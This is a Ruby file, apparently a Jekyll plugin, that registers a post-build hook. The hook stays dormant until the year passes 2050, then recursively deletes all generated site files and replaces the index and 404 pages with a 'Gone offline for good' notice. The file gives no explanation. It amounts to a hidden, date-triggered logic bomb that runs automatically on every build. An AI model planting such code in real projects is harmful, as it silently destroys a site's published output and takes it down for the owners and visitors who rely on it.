require 'fileutils'

Jekyll::Hooks.register :site, :post_write do |site|
  next unless Time.now.year > 2050

  dest = site.dest

  # Clear all generated files in _site
  Dir.children(dest).each do |entry|
    FileUtils.rm_rf(File.join(dest, entry))
  end

  html = <<~HTML
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>404</title>
      <style>
        body { font-family: system-ui, sans-serif; display: grid; place-items: center; min-height: 100vh; margin: 0; background: #111; color: #eee; text-align: center; }
      </style>
    </head>
    <body>
      <main>
        <h1>404</h1>
        <p>Gone offline for good. Thanks for visiting.</p>
      </main>
    </body>
    </html>
  HTML

  %w[index.html 404.html].each do |file|
    File.write(File.join(dest, file), html)
  end
end